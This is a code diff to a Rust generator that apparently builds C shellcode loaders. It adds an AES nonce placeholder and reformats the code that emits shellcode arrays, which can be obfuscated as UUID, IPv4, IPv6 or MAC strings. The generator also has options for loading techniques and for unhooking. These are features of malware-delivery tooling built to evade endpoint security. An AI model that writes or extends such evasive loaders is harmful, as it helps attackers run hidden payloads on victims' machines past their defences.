@@ -4,6 +4,7 @@ pub fn generate(
     lang: &str,
     shellcode: &[u8],
     key: &[u8],
+    nonce: &[u8],
     loading_technique: &str,
     obf_technique: &str,
     use_unhook: bool,
@@ -95,21 +96,24 @@ pub fn generate(
                 .map(|line| format!("\"{}\"", line))
                 .collect::<Vec<String>>()
                 .join(",\n    ");
-            
-            let definition = format!("const char* shellcode_strings[] = {{\n    {}\n}};", formatted_str);
-            
+
+            let definition = format!(
+                "const char* shellcode_strings[] = {{\n    {}\n}};",
+                formatted_str
+            );
+
             let block_size = match obf_technique {
                 "uuid" | "ipv6" => 16,
                 "mac" => 6,
                 "ipv4" => 4,
                 _ => 1,
             };
-            
+
             let size_calc = format!(
                 "int string_count = sizeof(shellcode_strings) / sizeof(shellcode_strings[0]);\n    int shellcode_size = string_count * {};", 
                 block_size
             );
-            
+
             let func_name = match obf_technique {
                 "uuid" => "deobfuscate_uuid",
                 "ipv4" => "deobfuscate_ipv4",
@@ -117,25 +121,31 @@ pub fn generate(
                 "mac" => "deobfuscate_mac",
                 _ => "",
             };
-            
-            let deobf_call = format!("{}(shellcode_strings, string_count, (unsigned char*)shellcode_mem);", func_name);
-            
+
+            let deobf_call = format!(
+                "{}(shellcode_strings, string_count, (unsigned char*)shellcode_mem);",
+                func_name
+            );
+
             (definition, size_calc, deobf_call)
-        },
+        }
         _ => {
             let formatted_str = shellcode
                 .iter()
                 .map(|b| format!("0x{:02x}", b))
                 .collect::<Vec<String>>()
                 .join(", ");
-            
-            let definition = format!("unsigned char shellcode_buf[] = {{\n    {}\n}};", formatted_str);
+
+            let definition = format!(
+                "unsigned char shellcode_buf[] = {{\n    {}\n}};",
+                formatted_str
+            );
             let size_calc = "int shellcode_size = sizeof(shellcode_buf);".to_string();
-            // Need string.h or intrinsic for memcpy, but let's assume it's available or use a loop if needed. 
+            // Need string.h or intrinsic for memcpy, but let's assume it's available or use a loop if needed.
             // Better yet, just use a simple loop to avoid dependency if header missing.
             // But loader.c.tpl has stdio.h, usually string.h is standard. Let's trust string.h is there or add it.
             let deobf_call = "for(int i=0; i<shellcode_size; i++) ((unsigned char*)shellcode_mem)[i] = shellcode_buf[i];".to_string();
-            
+
             (definition, size_calc, deobf_call)
         }
     };
@@ -145,6 +155,17 @@ pub fn generate(
         .map(|b| format!("0x{:02x}", b))
         .collect::<Vec<String>>()
         .join(", ");
+
+    let nonce_str = if !nonce.is_empty() {
+        let n_str = nonce
+            .iter()
+            .map(|b| format!("0x{:02x}", b))
+            .collect::<Vec<String>>()
+            .join(", ");
+        format!("{{{}}}", n_str)
+    } else {
+        "{0}".to_string() // Should not happen for AES, but valid C
+    };
 
     let decryption_call_str = match enc_technique {
         "aes" => format!(
@@ -157,8 +178,12 @@ pub fn generate(
     };
 
     let populated_template = main_template_content
-        .replace("// {{SHELLCODE_DEFINITION_PLACEHOLDER}}", &shellcode_definition)
+        .replace(
+            "// {{SHELLCODE_DEFINITION_PLACEHOLDER}}",
+            &shellcode_definition,
+        )
         .replace("// {{KEY_PLACEHOLDER}}", &key_str)
+        .replace("// {{NONCE_PLACEHOLDER}}", &nonce_str)
         .replace(
             "// {{DEOBFUSCATION_FUNCTION_PLACEHOLDER}}",
             &deobfuscation_template_content,
